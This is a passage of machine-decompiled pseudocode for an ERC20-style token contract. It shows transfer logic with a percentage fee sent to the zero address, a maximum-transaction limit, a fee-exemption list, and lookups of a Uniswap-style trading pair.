                                    if arg3 and _fee > -1 / arg3:
                                        revert with 'NH{q', 17
                                    require arg3 <= _maxTxAmount
                                    if not stor12:
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 0, 'IERC20: transfer amount exceeds balance'
                                    if arg3 < arg3 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg3 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg3 * _fee / 100
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 + (arg3 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * _fee / 100)
                                    emit Transfer((arg3 - (arg3 * _fee / 100)), arg1, arg2);
                                    if arg3 * _fee / 100 > 0:
                                        emit Transfer((arg3 * _fee / 100), arg1, 0);
    if allowance[address(arg1)][address(msg.sender)] < arg3:
        revert with 0, 'IERC20: transfer amount exceeds allowance'
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: transfer from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: transfer to the zero address'
    staticcall stor1.factory() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    staticcall stor1.WETH() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
            gas gas_remaining wei
           args address(this.address), address(ext_call.return_data[0])
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
    if arg1 != ext_call.return_data[12 len 20]:
        staticcall stor1.factory() with:
                gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        staticcall stor1.WETH() with:
                gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                gas gas_remaining wei
               args address(this.address), address(ext_call.return_data[0])
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        if ext_call.return_data[12 len 20] != msg.sender:
            if stor4[address(msg.sender)]:
                if not stor12:
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 0, 'IERC20: transfer amount exceeds balance'
                if arg2 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0] > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(msg.sender)] < arg2:
                    revert with 'NH{q', 17
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
            else:
                if stor4[address(arg1)]:
                    if not stor12:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 'IERC20: transfer amount exceeds balance'
                    if arg2 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if arg1 == this.address:
                        if not stor12:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 'IERC20: transfer amount exceeds balance'
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if msg.sender == ext_call.return_data[12 len 20]:
                            if not stor12:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 'IERC20: transfer amount exceeds balance'
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor12:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 'NH{q', 17
                                require arg2 <= _maxTxAmount
                                if not stor12:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 'IERC20: transfer amount exceeds balance'
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer((arg2 * _fee / 100), msg.sender, 0);
        else:
            if stor4[address(msg.sender)]:
                if not stor12:
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 0, 'IERC20: transfer amount exceeds balance'
                if arg2 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0] > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(msg.sender)] < arg2:
                    revert with 'NH{q', 17
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
            else:
                if stor4[address(arg1)]:
                    if not stor12:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 'IERC20: transfer amount exceeds balance'
                    if arg2 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if arg1 == this.address:
                        if not stor12:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 'IERC20: transfer amount exceeds balance'
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor4[address(arg1)]:
                            if not stor12:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 'IERC20: transfer amount exceeds balance'
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor12:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 'NH{q', 17
                                require arg2 <= _maxTxAmount
                                if not stor12:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 'IERC20: transfer amount exceeds balance'
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer((arg2 * _fee / 100), msg.sender, 0);
    else:
        if stor4[address(msg.sender)]:
            if stor4[address(msg.sender)]:
                if not stor12:
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 0, 'IERC20: transfer amount exceeds balance'
                if arg2 < 0:
                    revert with 'NH{q', 17
                if balanceOf[0] > -1:
                    revert with 'NH{q', 17
                if balanceOf[address(msg.sender)] < arg2:
                    revert with 'NH{q', 17
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
            else:
                if stor4[address(arg1)]:
                    if not stor12:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 'IERC20: transfer amount exceeds balance'
                    if arg2 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if arg1 == this.address:
                        if not stor12:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 'IERC20: transfer amount exceeds balance'
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if stor4[address(msg.sender)]:
                            if not stor12:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 'IERC20: transfer amount exceeds balance'
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor12:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 'NH{q', 17
                                require arg2 <= _maxTxAmount
                                if not stor12:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 'IERC20: transfer amount exceeds balance'
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer((arg2 * _fee / 100), msg.sender, 0);
        else:
            staticcall stor1.factory() with:
                    gas gas_remaining wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            staticcall stor1.WETH() with:
                    gas gas_remaining wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                    gas gas_remaining wei
                   args address(this.address), address(ext_call.return_data[0])
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            if ext_call.return_data[12 len 20] != msg.sender:
                if stor4[address(msg.sender)]:
                    if not stor12:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 'IERC20: transfer amount exceeds balance'
                    if arg2 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if stor4[address(arg1)]:
                        if not stor12:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 'IERC20: transfer amount exceeds balance'
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if arg1 == this.address:
                            if not stor12:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 'IERC20: transfer amount exceeds balance'
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if msg.sender == ext_call.return_data[12 len 20]:
                                if not stor12:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 'IERC20: transfer amount exceeds balance'
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor12:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg2 and _fee > -1 / arg2:
                                        revert with 'NH{q', 17
                                    require arg2 <= _maxTxAmount
                                    if not stor12:
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 'IERC20: transfer amount exceeds balance'
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
            else:
                if stor4[address(msg.sender)]:
                    if not stor12:
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 'IERC20: transfer amount exceeds balance'
                    if arg2 < 0:
                        revert with 'NH{q', 17
                    if balanceOf[0] > -1:
                        revert with 'NH{q', 17
                    if balanceOf[address(msg.sender)] < arg2:
                        revert with 'NH{q', 17
                    balanceOf[address(msg.sender)] -= arg2
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if stor4[address(arg1)]:
                        if not stor12:
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 'IERC20: transfer amount exceeds balance'
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if arg1 == this.address:
                            if not stor12:
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 'IERC20: transfer amount exceeds balance'
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            if stor4[address(arg1)]:
                                if not stor12:
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 'IERC20: transfer amount exceeds balance'
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                if stor12:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg2 and _fee > -1 / arg2:
                                        revert with 'NH{q', 17
                                    require arg2 <= _maxTxAmount
                                    if not stor12:
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 'IERC20: transfer amount exceeds balance'
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
    return 1
}



}
